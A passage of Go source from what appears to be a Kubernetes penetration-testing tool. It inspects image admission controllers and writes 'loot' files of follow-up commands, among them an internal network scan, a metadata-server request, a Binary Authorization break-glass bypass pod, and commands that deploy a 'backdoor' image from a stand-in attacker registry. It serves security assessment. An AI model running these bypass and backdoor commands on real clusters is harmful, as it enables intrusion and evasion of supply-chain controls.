			loot.Section("AllowedImages").Add("kubectl run nmap --image=instrumentisto/nmap --restart=Never -- -sn 10.0.0.0/8")
			loot.Section("AllowedImages").Add("kubectl run curl --image=curlimages/curl --restart=Never -- -s http://metadata.google.internal/")
			loot.Section("AllowedImages").Add("")
			loot.Section("AllowedImages").Add("# Create a deployment:")
			loot.Section("AllowedImages").Add("kubectl create deployment backdoor --image=<your-registry>/backdoor:latest")
			loot.Section("AllowedImages").Add("")
		} else {
			// Controllers exist but no explicit allow patterns detected
			// Check for specific controllers to provide targeted guidance
			hasGCPBinAuth := false
			for _, c := range controllers {
				if c.Type == "gcp-binauth" {
					hasGCPBinAuth = true
					break
				}
			}

			if hasGCPBinAuth {
				loot.Section("AllowedImages").Add("# ╔══════════════════════════════════════════════════════════╗")
				loot.Section("AllowedImages").Add("# ║  GCP BINARY AUTHORIZATION DETECTED                       ║")
				loot.Section("AllowedImages").Add("# ║  Images require attestation OR break-glass annotation    ║")
				loot.Section("AllowedImages").Add("# ╚══════════════════════════════════════════════════════════╝")
				loot.Section("AllowedImages").Add("")
				loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
				loot.Section("AllowedImages").Add("# BYPASS OPTION 1: BREAK-GLASS ANNOTATION")
				loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
				loot.Section("AllowedImages").Add("# The break-glass annotation allows bypassing Binary Authorization")
				loot.Section("AllowedImages").Add("# Note: This may trigger alerts/audit logs")
				loot.Section("AllowedImages").Add("")
				loot.Section("AllowedImages").Add("cat <<'EOF' | kubectl apply -f -")
				loot.Section("AllowedImages").Add("apiVersion: v1")
				loot.Section("AllowedImages").Add("kind: Pod")
				loot.Section("AllowedImages").Add("metadata:")
				loot.Section("AllowedImages").Add("  name: break-glass-test")
				loot.Section("AllowedImages").Add("  annotations:")
				loot.Section("AllowedImages").Add("    alpha.image-policy.k8s.io/break-glass: \"true\"")
				loot.Section("AllowedImages").Add("spec:")
				loot.Section("AllowedImages").Add("  containers:")
				loot.Section("AllowedImages").Add("  - name: shell")
				loot.Section("AllowedImages").Add("    image: ubuntu:latest")
				loot.Section("AllowedImages").Add("    command: [\"sleep\", \"3600\"]")
				loot.Section("AllowedImages").Add("EOF")
				loot.Section("AllowedImages").Add("")
				loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
				loot.Section("AllowedImages").Add("# BYPASS OPTION 2: USE ATTESTED IMAGES")
				loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
				loot.Section("AllowedImages").Add("# Check which attestors are configured:")
				loot.Section("AllowedImages").Add("gcloud container binauthz policy export")
				loot.Section("AllowedImages").Add("")
				loot.Section("AllowedImages").Add("# List attestors:")
				loot.Section("AllowedImages").Add("gcloud container binauthz attestors list")
				loot.Section("AllowedImages").Add("")
				loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
				loot.Section("AllowedImages").Add("# ENUMERATION")
				loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
				loot.Section("AllowedImages").Add("")
				loot.Section("AllowedImages").Add("# Check what images are already running (these have attestations):")
				loot.Section("AllowedImages").Add("kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{\"\\n\"}{end}' | sort -u")
				loot.Section("AllowedImages").Add("")
				loot.Section("AllowedImages").Add("# Check if any pods have break-glass annotation:")
				loot.Section("AllowedImages").Add("kubectl get pods -A -o json | jq -r '.items[] | select(.metadata.annotations[\"alpha.image-policy.k8s.io/break-glass\"]==\"true\") | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
				loot.Section("AllowedImages").Add("")
				loot.Section("AllowedImages").Add("# Check webhook configuration:")
				loot.Section("AllowedImages").Add("kubectl get validatingwebhookconfigurations -o yaml | grep -A30 imagepolicy")
				loot.Section("AllowedImages").Add("")
			} else {
				loot.Section("AllowedImages").Add("# No explicit allowed image patterns detected from policies")
				loot.Section("AllowedImages").Add("# Controllers are present but policies may use default-deny or")
				loot.Section("AllowedImages").Add("# dynamic verification (signatures, attestations, scanning)")
				loot.Section("AllowedImages").Add("")
				loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
				loot.Section("AllowedImages").Add("# ENUMERATION COMMANDS")
				loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
				loot.Section("AllowedImages").Add("")
				loot.Section("AllowedImages").Add("# Check what images are already running (these passed admission):")
				loot.Section("AllowedImages").Add("kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{\"\\n\"}{end}' | sort -u")
				loot.Section("AllowedImages").Add("")
				loot.Section("AllowedImages").Add("# Get registries in use (these are likely allowed):")
				loot.Section("AllowedImages").Add("kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{\"\\n\"}{end}' | cut -d'/' -f1 | sort -u")
				loot.Section("AllowedImages").Add("")
				loot.Section("AllowedImages").Add("# Check Kyverno policies for image rules:")
				loot.Section("AllowedImages").Add("kubectl get clusterpolicies -o yaml | grep -A20 'image\\|registry\\|pattern'")
				loot.Section("AllowedImages").Add("")
				loot.Section("AllowedImages").Add("# Check Gatekeeper constraints for image rules:")
				loot.Section("AllowedImages").Add("kubectl get constraints -A -o yaml | grep -A20 'repos\\|images\\|registries'")
				loot.Section("AllowedImages").Add("")
				loot.Section("AllowedImages").Add("# Check OPA policies:")
				loot.Section("AllowedImages").Add("kubectl get configmaps -n opa -o yaml | grep -A50 'allowed_registries\\|image_policy'")
			}
			loot.Section("AllowedImages").Add("")
			loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
			loot.Section("AllowedImages").Add("# TEST DEPLOYMENT COMMANDS")
			loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
			loot.Section("AllowedImages").Add("")
			loot.Section("AllowedImages").Add("# Test if public registries are blocked:")
			loot.Section("AllowedImages").Add("kubectl run test-dockerhub --image=nginx:latest --restart=Never --dry-run=server")
			loot.Section("AllowedImages").Add("kubectl run test-gcr --image=gcr.io/google-containers/pause:latest --restart=Never --dry-run=server")
			loot.Section("AllowedImages").Add("kubectl run test-ghcr --image=ghcr.io/github/super-linter:latest --restart=Never --dry-run=server")
			loot.Section("AllowedImages").Add("")
			loot.Section("AllowedImages").Add("# Test a custom registry:")
			loot.Section("AllowedImages").Add("kubectl run test-custom --image=<registry>/<image>:<tag> --restart=Never --dry-run=server")
			loot.Section("AllowedImages").Add("")
		}

		// Show images already in use (these definitely work)
		if len(imageSourceAnalysis.RegistryBreakdown) > 0 {
			loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
			loot.Section("AllowedImages").Add("# IMAGES ALREADY DEPLOYED (confirmed working)")
			loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
			loot.Section("AllowedImages").Add("")
			loot.Section("AllowedImages").Add("# These images passed admission and are currently running.")
			loot.Section("AllowedImages").Add("# You can deploy similar images from the same registries:")
			loot.Section("AllowedImages").Add("")

			for registry, usage := range imageSourceAnalysis.RegistryBreakdown {
				regType := "private"
				if usage.IsPublic {
					regType = "PUBLIC"
				}
				loot.Section("AllowedImages").Addf("# Registry: %s (%s) - %d images deployed", registry, regType, usage.ImageCount)

				// Show sample images that are deployed
				count := 0
				for _, img := range usage.UniqueImages {
					if count >= 3 {
						loot.Section("AllowedImages").Addf("#   ... and %d more images", len(usage.UniqueImages)-3)
						break
					}
					loot.Section("AllowedImages").Addf("#   - %s", img)
					count++
				}

				// Provide deploy command for this registry
				loot.Section("AllowedImages").Add("#")
				loot.Section("AllowedImages").Addf("kubectl run test-%s --image=%s/<your-image>:<tag> --restart=Never",
					strings.ReplaceAll(strings.Split(registry, ".")[0], "/", "-"),
					registry)
				loot.Section("AllowedImages").Add("")
			}
		}
	} else {
		loot.Section("AllowedImages").Addf("# Found %d allowed image pattern(s)", len(allowedImages))
		loot.Section("AllowedImages").Add("")

		for _, entry := range allowedImages {
			loot.Section("AllowedImages").Add("# ─────────────────────────────────────────────────────────────")
			loot.Section("AllowedImages").Addf("# Controller: %s | Policy: %s", entry.Controller, entry.PolicyName)
			loot.Section("AllowedImages").Addf("# Pattern: %s", entry.AllowedPattern)
			loot.Section("AllowedImages").Addf("# Scope: %s", entry.Scope)
			if len(entry.Namespaces) > 0 {
				loot.Section("AllowedImages").Addf("# Namespaces: %s", strings.Join(entry.Namespaces, ", "))
			}
			if entry.SignatureRequired {
				loot.Section("AllowedImages").Add("# Signature: REQUIRED")
			} else {
				loot.Section("AllowedImages").Add("# Signature: Not required")
			}
			if entry.AttestationReq != "" {
				loot.Section("AllowedImages").Addf("# Attestations: %s", entry.AttestationReq)
			}
			if entry.Conditions != "" {
				loot.Section("AllowedImages").Addf("# Conditions: %s", entry.Conditions)
			}
			loot.Section("AllowedImages").Add("#")
			loot.Section("AllowedImages").Add("# Deploy command:")
			loot.Section("AllowedImages").Add(entry.DeployCommand)
			loot.Section("AllowedImages").Add("")
		}
	}

	// Image source analysis loot
	loot.Section("ImageSources").Add("\n# ═══════════════════════════════════════════════════════════")
	loot.Section("ImageSources").Add("# IMAGE SOURCE ANALYSIS")
	loot.Section("ImageSources").Add("# ═══════════════════════════════════════════════════════════")
	loot.Section("ImageSources").Add("")
	loot.Section("ImageSources").Addf("# Total Images: %d", imageSourceAnalysis.TotalImages)
	loot.Section("ImageSources").Addf("# Unique Images: %d", imageSourceAnalysis.UniqueImages)
	loot.Section("ImageSources").Addf("# Registries: %d (%d public, %d private)",
		len(imageSourceAnalysis.RegistryBreakdown),
		imageSourceAnalysis.PublicRegistryCount,
		imageSourceAnalysis.PrivateRegistryCount)
	loot.Section("ImageSources").Addf("# Using :latest tag: %d", imageSourceAnalysis.LatestTagCount)
	loot.Section("ImageSources").Addf("# Digest pinned: %d", imageSourceAnalysis.DigestPinnedCount)
	loot.Section("ImageSources").Addf("# Without digest: %d", imageSourceAnalysis.ImagesWithoutDigest)
	loot.Section("ImageSources").Add("")

	loot.Section("ImageSources").Add("# Registry breakdown:")
	for registry, usage := range imageSourceAnalysis.RegistryBreakdown {
		regType := "private"
		if usage.IsPublic {
			regType = "PUBLIC"
		}
		loot.Section("ImageSources").Addf("#   %s (%s): %d images, %d unique, %d :latest",
			registry, regType, usage.ImageCount, len(usage.UniqueImages), usage.LatestCount)
	}
	loot.Section("ImageSources").Add("")

	loot.Section("ImageSources").Add("# List all images in cluster:")
	loot.Section("ImageSources").Add("kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{\"\\n\"}{end}' | sort -u")
	loot.Section("ImageSources").Add("")
	loot.Section("ImageSources").Add("# Find images using :latest:")
	loot.Section("ImageSources").Add("kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{\" \"}{.metadata.name}{\" \"}{.spec.containers[*].image}{\"\\n\"}{end}' | grep -E ':latest|[^:]$'")
	loot.Section("ImageSources").Add("")

	// Public registry loot
	loot.Section("PublicRegistries").Add("\n# ═══════════════════════════════════════════════════════════")
	loot.Section("PublicRegistries").Add("# PUBLIC REGISTRIES DETECTED")
	loot.Section("PublicRegistries").Add("# ═══════════════════════════════════════════════════════════")
	loot.Section("PublicRegistries").Add("")

	publicFound := false
	for registry, usage := range imageSourceAnalysis.RegistryBreakdown {
		if usage.IsPublic {
			publicFound = true
			blocked := policyEffectiveness.PublicRegistryBlocked[registry]
			status := "[ALLOWED]"
			if blocked {
				status = "[BLOCKED]"
			}

			loot.Section("PublicRegistries").Addf("# %s %s", status, registry)
			if name, ok := publicRegistries[registry]; ok {
				loot.Section("PublicRegistries").Addf("#   Name: %s", name)
			}
			loot.Section("PublicRegistries").Addf("#   Images: %d | Unique: %d | Namespaces: %d",
				usage.ImageCount, len(usage.UniqueImages), len(usage.Namespaces))

			if usage.LatestCount > 0 {
				loot.Section("PublicRegistries").Addf("#   WARNING: %d images using :latest tag", usage.LatestCount)
			}

			// Show sample images
			if len(usage.UniqueImages) > 0 {
				loot.Section("PublicRegistries").Add("#   Sample images:")
				for i, img := range usage.UniqueImages {
					if i >= 5 {
						loot.Section("PublicRegistries").Addf("#     ... and %d more", len(usage.UniqueImages)-5)
						break
					}
					loot.Section("PublicRegistries").Addf("#     - %s", img)
				}
			}
			loot.Section("PublicRegistries").Add("")
		}
	}

	if !publicFound {
		loot.Section("PublicRegistries").Add("# No public registries detected - good security posture!")
		loot.Section("PublicRegistries").Add("")
	}

	// If no controllers, show how to deploy from public registries
	if len(controllers) == 0 && publicFound {
		loot.Section("PublicRegistries").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("PublicRegistries").Add("# CRITICAL: No image admission - can deploy from ANY registry")
		loot.Section("PublicRegistries").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("PublicRegistries").Add("")
		loot.Section("PublicRegistries").Add("# Deploy from Docker Hub:")
		loot.Section("PublicRegistries").Add("kubectl run test --image=alpine -- sleep 3600")
		loot.Section("PublicRegistries").Add("")
		loot.Section("PublicRegistries").Add("# Deploy from any registry:")
		loot.Section("PublicRegistries").Add("kubectl run backdoor --image=attacker.registry.io/malicious:latest -- /malware")
		loot.Section("PublicRegistries").Add("")
	}

	// Policy gaps loot
	loot.Section("PolicyGaps").Add("\n# ═══════════════════════════════════════════════════════════")
	loot.Section("PolicyGaps").Add("# POLICY GAPS ANALYSIS")
	loot.Section("PolicyGaps").Add("# ═══════════════════════════════════════════════════════════")
	loot.Section("PolicyGaps").Add("")
	loot.Section("PolicyGaps").Addf("# Blocking Level: %s", policyEffectiveness.BlockingLevel)
	loot.Section("PolicyGaps").Addf("# Reason: %s", policyEffectiveness.BlockingReason)
	loot.Section("PolicyGaps").Add("")

	if len(policyEffectiveness.UncoveredRegistries) > 0 {
		loot.Section("PolicyGaps").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("PolicyGaps").Add("# UNCOVERED REGISTRIES (no policy)")
		loot.Section("PolicyGaps").Add("# ─────────────────────────────────────────────────────────────")
		for _, reg := range policyEffectiveness.UncoveredRegistries {
			loot.Section("PolicyGaps").Addf("# - %s", reg)
		}
		loot.Section("PolicyGaps").Add("")
	}

	if len(policyEffectiveness.WeakPolicies) > 0 {
		loot.Section("PolicyGaps").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("PolicyGaps").Add("# WEAK POLICIES")
		loot.Section("PolicyGaps").Add("# ─────────────────────────────────────────────────────────────")
		for _, weak := range policyEffectiveness.WeakPolicies {
			loot.Section("PolicyGaps").Addf("# - %s", weak)
		}
		loot.Section("PolicyGaps").Add("")
	}

	if len(policyEffectiveness.WildcardAllows) > 0 {
		loot.Section("PolicyGaps").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("PolicyGaps").Add("# WILDCARD ALLOW PATTERNS")
		loot.Section("PolicyGaps").Add("# ─────────────────────────────────────────────────────────────")
		for _, wc := range policyEffectiveness.WildcardAllows {
			loot.Section("PolicyGaps").Addf("# - %s", wc)
		}
		loot.Section("PolicyGaps").Add("")
	}

	if policyEffectiveness.UnsignedAllowed {
		loot.Section("PolicyGaps").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("PolicyGaps").Add("# WARNING: UNSIGNED IMAGES ALLOWED")
		loot.Section("PolicyGaps").Add("# ─────────────────────────────────────────────────────────────")
		loot.Section("PolicyGaps").Add("# Images without signatures can be deployed")
		loot.Section("PolicyGaps").Add("# This allows supply chain attacks via compromised registries")
		loot.Section("PolicyGaps").Add("")
	}

	// Recommendations loot
	if len(policyEffectiveness.Recommendations) > 0 {
		loot.Section("Recommendations").Add("\n# ═══════════════════════════════════════════════════════════")
		loot.Section("Recommendations").Add("# SECURITY RECOMMENDATIONS")
		loot.Section("Recommendations").Add("# ═══════════════════════════════════════════════════════════")
		loot.Section("Recommendations").Add("")
		for i, rec := range policyEffectiveness.Recommendations {
			loot.Section("Recommendations").Addf("# %d. %s", i+1, rec)
		}
		loot.Section("Recommendations").Add("")
	}

	// Build tables
	tables := []internal.TableFile{
		{
			Name:   "Image-Admission-Summary",
			Header: summaryHeaders,
			Body:   summaryRows,
		},
		{
			Name:   "Image-Admission-Controllers",
			Header: controllerHeaders,
			Body:   controllerRows,
		},
	}

	if len(registryRows) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "Image-Registry-Breakdown",
			Header: registryHeaders,
			Body:   registryRows,
		})
	}

	if len(findingRows) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "Image-Admission-Policies",
			Header: findingHeaders,
			Body:   findingRows,
		})
	}

	if len(allowedImagesRows) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "Image-Allowed-Images",
			Header: allowedImagesHeaders,
			Body:   allowedImagesRows,
		})
	}

	lootFiles := loot.Build()

	err := internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Image-Admission",
		globals.ClusterName,
		"results",
		ImageAdmissionOutput{
			Table: tables,
			Loot:  lootFiles,
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), K8S_IMAGE_ADMISSION_MODULE_NAME)
		return
	}

	// Summary
	if len(controllers) == 0 {
		logger.ErrorM("No image admission controllers detected - any image can be deployed!", K8S_IMAGE_ADMISSION_MODULE_NAME)
	} else {
		blockingStatus := policyEffectiveness.BlockingLevel
		if policyEffectiveness.IsBlocking {
			blockingStatus = "ENFORCING"
		}
		logger.InfoM(fmt.Sprintf("%d image admission controller(s) detected [%s]", len(controllers), blockingStatus), K8S_IMAGE_ADMISSION_MODULE_NAME)
		for _, c := range controllers {
			logger.InfoM(fmt.Sprintf("  - %s (%s): %d policies", c.Name, c.Type, c.PolicyCount), K8S_IMAGE_ADMISSION_MODULE_NAME)
		}
	}

	// Image source summary
	logger.InfoM(fmt.Sprintf("Image Analysis: %d images from %d registries (%d public, %d private)",
		imageSourceAnalysis.TotalImages,
		len(imageSourceAnalysis.RegistryBreakdown),
		imageSourceAnalysis.PublicRegistryCount,
		imageSourceAnalysis.PrivateRegistryCount), K8S_IMAGE_ADMISSION_MODULE_NAME)

	if imageSourceAnalysis.LatestTagCount > 0 {
		logger.InfoM(fmt.Sprintf("  WARNING: %d images using :latest tag", imageSourceAnalysis.LatestTagCount), K8S_IMAGE_ADMISSION_MODULE_NAME)
	}

	if len(policyEffectiveness.UncoveredRegistries) > 0 {
		logger.InfoM(fmt.Sprintf("  WARNING: %d registries not covered by policies", len(policyEffectiveness.UncoveredRegistries)), K8S_IMAGE_ADMISSION_MODULE_NAME)
	}

	if len(policyEffectiveness.BypassVectors) > 0 {
		logger.InfoM(fmt.Sprintf("  WARNING: %d bypass vectors identified", len(policyEffectiveness.BypassVectors)), K8S_IMAGE_ADMISSION_MODULE_NAME)
	}

	if len(findings) > 0 {
		logger.InfoM(fmt.Sprintf("%d image policy finding(s)", len(findings)), K8S_IMAGE_ADMISSION_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", K8S_IMAGE_ADMISSION_MODULE_NAME), K8S_IMAGE_ADMISSION_MODULE_NAME)
}

// analyzePortieris analyzes Portieris image policies
func analyzePortieris(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []PortierisPolicy) {
	controller := ImageAdmissionController{}
	var policies []PortierisPolicy

	// Check for Portieris webhook
	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	var webhookFound bool
	var whObject map[string]interface{}
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			if strings.Contains(strings.ToLower(name), "portieris") {
				controller.Name = "Portieris"
				controller.Type = "portieris"
				controller.WebhookName = name
				webhookFound = true
				whObject = wh.Object

				// Get failure policy
				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify webhook targets workloads
	if !webhookTargetsWorkloads(whObject) {
		controller.Status = "webhook-misconfigured"
		controller.BypassRisk = "Webhook does not target workload resources"
		return controller, policies
	}

	// Verify Portieris pods are running and verify images
	podsRunning, podStatus, imageVerified := verifyPodsRunningWithImage(ctx, clientset, []string{"portieris", "ibm-system"}, "app=portieris", "portieris")
	if !podsRunning {
		controller.Status = "not-running"
		controller.BypassRisk = fmt.Sprintf("Controller pods not running: %s", podStatus)
		return controller, policies
	}

	controller.Status = "active"
	controller.ImageVerified = imageVerified

	// Get ClusterImagePolicies
	cipGVR := schema.GroupVersionResource{
		Group:    "portieris.cloud.ibm.com",
		Version:  "v1",
		Resource: "clusterimagepolicies",
	}

	cipList, err := dynClient.Resource(cipGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, cip := range cipList.Items {
			policy := PortierisPolicy{
				Name:            cip.GetName(),
				IsClusterPolicy: true,
			}

			if repos, ok, _ := unstructured.NestedSlice(cip.Object, "spec", "repositories"); ok {
				for _, r := range repos {
					if rMap, ok := r.(map[string]interface{}); ok {
						repo := PortierisRepo{}
						if name, ok := rMap["name"].(string); ok {
							repo.Name = name
						}
						if policy, ok, _ := unstructured.NestedString(rMap, "policy", "trust", "enabled"); ok {
							if policy == "true" {
								repo.Policy = "trust"
							}
						}
						if simple, ok, _ := unstructured.NestedMap(rMap, "policy", "simple"); ok {
							if _, ok := simple["requirements"]; ok {
								repo.Policy = "trust"
							}
						}
						if repo.Policy == "" {
							repo.Policy = "allow"
						}
						policy.Repositories = append(policy.Repositories, repo)
					}
				}
			}

			policies = append(policies, policy)
			controller.PolicyCount++
		}
	}

	// Get ImagePolicies (namespace-scoped)
	ipGVR := schema.GroupVersionResource{
		Group:    "portieris.cloud.ibm.com",
		Version:  "v1",
		Resource: "imagepolicies",
	}

	ipList, err := dynClient.Resource(ipGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, ip := range ipList.Items {
			policy := PortierisPolicy{
				Name:            ip.GetName(),
				Namespace:       ip.GetNamespace(),
				IsClusterPolicy: false,
			}

			if repos, ok, _ := unstructured.NestedSlice(ip.Object, "spec", "repositories"); ok {
				for _, r := range repos {
					if rMap, ok := r.(map[string]interface{}); ok {
						repo := PortierisRepo{}
						if name, ok := rMap["name"].(string); ok {
							repo.Name = name
						}
						if enabled, ok, _ := unstructured.NestedBool(rMap, "policy", "trust", "enabled"); ok && enabled {
							repo.Policy = "trust"
						}
						if repo.Policy == "" {
							repo.Policy = "allow"
						}
						policy.Repositories = append(policy.Repositories, repo)
					}
				}
			}

			policies = append(policies, policy)
			controller.PolicyCount++
		}
	}

	controller.SignatureReqs = false
	allowAllFound := false
	for _, p := range policies {
		for _, r := range p.Repositories {
			if r.Policy == "trust" {
				controller.SignatureReqs = true
			}
			// Check for allow-all patterns
			if r.Policy == "allow" && (r.Name == "*" || r.Name == "*/*" || r.Name == "**") {
				allowAllFound = true
			}
		}
	}

	// Check for bypass risks
	if controller.PolicyCount == 0 {
		controller.BypassRisk = "No policies configured - all images allowed"
	} else if allowAllFound {
		controller.BypassRisk = "Allow-all policy found - verification can be bypassed"
	} else if controller.FailurePolicy == "Ignore" {
		controller.BypassRisk = "FailurePolicy=Ignore allows bypass during controller failures"
	}

	return controller, policies
}

// analyzeConnaisseur analyzes Connaisseur configuration
func analyzeConnaisseur(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []ConnaisseurPolicy) {
	controller := ImageAdmissionController{}
	var policies []ConnaisseurPolicy

	// Check for Connaisseur webhook
	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	var webhookFound bool
	var whObject map[string]interface{}
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			if strings.Contains(strings.ToLower(name), "connaisseur") {
				controller.Name = "Connaisseur"
				controller.Type = "connaisseur"
				controller.WebhookName = name
				controller.Namespace = "connaisseur"
				webhookFound = true
				whObject = wh.Object

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify webhook targets workloads
	if !webhookTargetsWorkloads(whObject) {
		controller.Status = "webhook-misconfigured"
		controller.BypassRisk = "Webhook does not target workload resources"
		return controller, policies
	}

	// Verify Connaisseur pods are running and verify images
	podsRunning, podStatus, imageVerified := verifyPodsRunningWithImage(ctx, clientset, []string{"connaisseur"}, "app.kubernetes.io/name=connaisseur", "connaisseur")
	if !podsRunning {
		// Try alternate label selector
		podsRunning, podStatus, imageVerified = verifyPodsRunningWithImage(ctx, clientset, []string{"connaisseur"}, "app=connaisseur", "connaisseur")
	}
	if !podsRunning {
		controller.Status = "not-running"
		controller.BypassRisk = fmt.Sprintf("Controller pods not running: %s", podStatus)
		return controller, policies
	}

	controller.Status = "active"
	controller.ImageVerified = imageVerified
	// Connaisseur uses ConfigMap for configuration
	// We can try to parse it but it's YAML inside a ConfigMap
	controller.SignatureReqs = true // Connaisseur is signature-focused

	// Check for bypass risks
	if controller.FailurePolicy == "Ignore" {
		controller.BypassRisk = "FailurePolicy=Ignore allows bypass during controller failures"
	}

	return controller, policies
}

// analyzeRatify analyzes Ratify configuration
func analyzeRatify(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []RatifyPolicy) {
	controller := ImageAdmissionController{}
	var policies []RatifyPolicy

	// Check for Ratify webhook (usually integrated with Gatekeeper)
	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	var webhookFound bool
	var whObject map[string]interface{}
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			if strings.Contains(strings.ToLower(name), "ratify") {
				controller.Name = "Ratify"
				controller.Type = "ratify"
				controller.WebhookName = name
				controller.Namespace = "gatekeeper-system"
				webhookFound = true
				whObject = wh.Object

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify webhook targets workloads
	if !webhookTargetsWorkloads(whObject) {
		controller.Status = "webhook-misconfigured"
		controller.BypassRisk = "Webhook does not target workload resources"
		return controller, policies
	}

	// Verify Ratify pods are running (could be in gatekeeper-system or ratify-system)
	podsRunning, podStatus, imageVerified := verifyPodsRunningWithImage(ctx, clientset, []string{"gatekeeper-system", "ratify-system", "ratify"}, "app=ratify", "ratify")
	if !podsRunning {
		// Try Gatekeeper pods as Ratify often runs with Gatekeeper
		podsRunning, podStatus, imageVerified = verifyPodsRunningWithImage(ctx, clientset, []string{"gatekeeper-system"}, "control-plane=controller-manager", "ratify")
	}
	if !podsRunning {
		controller.Status = "not-running"
		controller.BypassRisk = fmt.Sprintf("Controller pods not running: %s", podStatus)
		return controller, policies
	}

	controller.Status = "active"
	controller.ImageVerified = imageVerified

	// Get Verifiers
	verifierGVR := schema.GroupVersionResource{
		Group:    "config.ratify.deislabs.io",
		Version:  "v1beta1",
		Resource: "verifiers",
	}

	verifierList, err := dynClient.Resource(verifierGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, v := range verifierList.Items {
			policy := RatifyPolicy{
				Name:      v.GetName(),
				Namespace: v.GetNamespace(),
			}

			if artifactTypes, ok, _ := unstructured.NestedStringSlice(v.Object, "spec", "artifactTypes"); ok {
				policy.ArtifactTypes = artifactTypes
			}

			policies = append(policies, policy)
			controller.PolicyCount++
		}
	}

	controller.SignatureReqs = true

	// Check for bypass risks
	if controller.PolicyCount == 0 {
		controller.BypassRisk = "No verifiers configured - signature verification may not be active"
	} else if controller.FailurePolicy == "Ignore" {
		controller.BypassRisk = "FailurePolicy=Ignore allows bypass during controller failures"
	}

	return controller, policies
}

// analyzeKritis analyzes Kritis configuration
func analyzeKritis(ctx context.Context, clientset kubernetes.Interface, dynClient dynamic.Interface) (ImageAdmissionController, []KritisPolicy) {
	controller := ImageAdmissionController{}
	var policies []KritisPolicy

	// Check for Kritis webhook
	whGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}

	var webhookFound bool
	var whObject map[string]interface{}
	whList, err := dynClient.Resource(whGVR).List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, wh := range whList.Items {
			name := wh.GetName()
			if strings.Contains(strings.ToLower(name), "kritis") {
				controller.Name = "Kritis"
				controller.Type = "kritis"
				controller.WebhookName = name
				webhookFound = true
				whObject = wh.Object

				if webhooks, ok := wh.Object["webhooks"].([]interface{}); ok && len(webhooks) > 0 {
					if whMap, ok := webhooks[0].(map[string]interface{}); ok {
						if fp, ok := whMap["failurePolicy"].(string); ok {
							controller.FailurePolicy = fp
						}
					}
				}
				break
			}
		}
	}

	if !webhookFound {
		return controller, policies
	}

	// Verify webhook targets workloads
	if !webhookTargetsWorkloads(whObject) {
